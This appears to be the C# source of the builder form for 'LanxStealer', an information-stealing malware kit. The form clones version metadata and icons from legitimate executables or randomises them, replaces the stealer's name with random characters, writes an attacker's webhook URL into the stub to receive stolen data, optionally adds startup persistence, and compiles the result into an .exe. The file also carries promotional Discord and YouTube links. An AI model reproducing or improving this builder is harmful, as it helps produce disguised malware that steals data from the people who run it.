using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Net;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Reflection;
using lanx1337.Util;
using System.Drawing;

namespace lanx1337
{
    //renaming = gay atleast gimme some credits 
    public partial class Form1 : Form
    {
        private readonly Random random = new Random();
        private readonly List<string> urlList = new List<string>();
        private readonly RandomCharacters randomCharacters;
        private readonly RandomFileInfo randomFileInfo;

        public Form1()
        {
            this.randomCharacters = new RandomCharacters();
            this.randomFileInfo = new RandomFileInfo(randomCharacters);
            InitializeComponent();
        }


        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void btnClone_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                    txtTitle.Text = fileVersionInfo.InternalName ?? string.Empty;
                    txtDescription.Text = fileVersionInfo.FileDescription ?? string.Empty;
                    txtProduct.Text = fileVersionInfo.CompanyName ?? string.Empty;
                    txtCompany.Text = fileVersionInfo.ProductName ?? string.Empty;
                    txtCopyright.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                    txtTrademark.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;

                    var version = fileVersionInfo.FileMajorPart;
                    assemblyMajorVersion.Text = fileVersionInfo.FileMajorPart.ToString();
                    assemblyMinorVersion.Text = fileVersionInfo.FileMinorPart.ToString();
                    assemblyBuildPart.Text = fileVersionInfo.FileBuildPart.ToString();
                    assemblyPrivatePart.Text = fileVersionInfo.FilePrivatePart.ToString();
                }
            }
        }

        private void btnIconOpen_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Icon (*.ico)|*.ico";
                if (openFileDialog.ShowDialog() == DialogResult.OK) //icon changer 
                {
                    txtIcon.Text = openFileDialog.FileName;
                    pictureIcon.ImageLocation = openFileDialog.FileName;
                    pictureIcon.BorderStyle = BorderStyle.FixedSingle;
                }
                else
                {
                    txtIcon.Text = string.Empty;
                    pictureIcon.ImageLocation = string.Empty;
                }
            }
        }
        private void txtIcon_TextChanged(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtIcon.Text))
            {
                txtIcon.Text = string.Empty;
                pictureIcon.ImageLocation = string.Empty; 
                pictureIcon.BorderStyle = BorderStyle.None;
            }
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            //Replaces the stub code what you writed on textboxes
            try
            {
                using (var saveFileDialog = new SaveFileDialog())
                {
                    saveFileDialog.Filter = "Executable (*.exe)|*.exe";
                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var stubSource = Properties.Resources.Stub;
                        stubSource = stubSource.Replace("LanxStealer", randomCharacters.getRandomCharacters(random.Next(10, 20)));
                        stubSource = stubSource.Replace("%Title%", txtTitle.Text);
                        stubSource = stubSource.Replace("%Description%", txtDescription.Text);
                        stubSource = stubSource.Replace("%Product%", txtProduct.Text);
                        stubSource = stubSource.Replace("%Company%", txtCompany.Text);
                        stubSource = stubSource.Replace("%Copyright%", txtCopyright.Text);
                        stubSource = stubSource.Replace("%Trademark%", txtTrademark.Text);
                        stubSource = stubSource.Replace("%v1%", assemblyMajorVersion.Text);
                        stubSource = stubSource.Replace("%v2%", assemblyMinorVersion.Text);
                        stubSource = stubSource.Replace("%v3%", assemblyBuildPart.Text);
                        stubSource = stubSource.Replace("%v4%", assemblyPrivatePart.Text);
                        stubSource = stubSource.Replace("%Guid%", Guid.NewGuid().ToString());
                        stubSource = stubSource.Replace("#webhook", textBox1.Text);
                        if (Startup.Checked == true)
                        {
                            stubSource = stubSource.Replace("//startuplolhehe", "Startup();"); // startup setting thx to srmotion
                        }

                        var isOK = Compiler.CompileFromSource(stubSource, saveFileDialog.FileName, string.IsNullOrWhiteSpace(txtIcon.Text) ? null : txtIcon.Text);

                        if (isOK)
                        {
                            MessageBox.Show("Done! subscribe to lanx GT :D");
                        }
                    }

                }
            }
            catch (Exception ex)
            {
                labelBuild.Text = ex.Message;
            }
        }

        private void Startup_CheckboxChanged(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Start();
            const string ApplicationDataFolder = "ApplicationData"; //i forgot to remove these junk codes those codes are that i wanted to add startup and i failed so i made other methode
            foreach (var typeSpecialFolder in Enum.GetValues(typeof(Environment.SpecialFolder)))
            {
                cbInstallFolder.Items.Add(typeSpecialFolder);
                if (typeSpecialFolder.ToString() == ApplicationDataFolder)
                {
                    cbInstallFolder.Text = ApplicationDataFolder;
                }
            }
        }

        private void btnRandom_Click(object sender, EventArgs e)
        {
            {
                var newInfo = randomFileInfo.getRandomFileInfo();
                txtTitle.Text = newInfo.Title;
                txtDescription.Text = newInfo.Description;
                txtProduct.Text = newInfo.Product;
                txtCompany.Text = newInfo.Company;
                txtCopyright.Text = newInfo.Copyright;
                txtTrademark.Text = newInfo.Trademark;
                assemblyMajorVersion.Text = newInfo.MajorVersion;
                assemblyMinorVersion.Text = newInfo.MinorVersion;
                assemblyBuildPart.Text = newInfo.BuildPart;
                assemblyPrivatePart.Text = newInfo.PrivatePart;
            }
        }
        private void Anan_CheckedChanged(object sender, EventArgs e)
        {
            if (Anan.Checked)
            {
                textBox1.UseSystemPasswordChar = false;
            }
            else
            {
                textBox1.UseSystemPasswordChar = true;
            }
        }

        private void label13_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.youtube.com/channel/UCR2H2vRZ-MlzAM7TZ7C4Prw");
        }

        private void label1_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/xWrYVavg");
        }

        private void label15_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.youtube.com/channel/UCR2H2vRZ-MlzAM7TZ7C4Prw");
        }

        private void label14_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/xWrYVavg");
        }

        private void panel2_MouseDown(object sender, MouseEventArgs e)
        {
            Process.Start("https://www.youtube.com/channel/UCR2H2vRZ-MlzAM7TZ7C4Prw");
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            Process.Start("https://discord.gg/X44Xt3gmss");
            Process.Start("https://discord.gg/WhjMYEB8TP");
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Start();

            Random rand = new Random();
            int A = rand.Next(0, 255);
            int R = rand.Next(0, 255);
            int G = rand.Next(0, 255);
            int B = rand.Next(0, 255); lanxhax.ForeColor = Color.FromArgb(A, R, G, B);

        }

        private void lanxhax_Click(object sender, EventArgs e)
        {

        }
    }
}
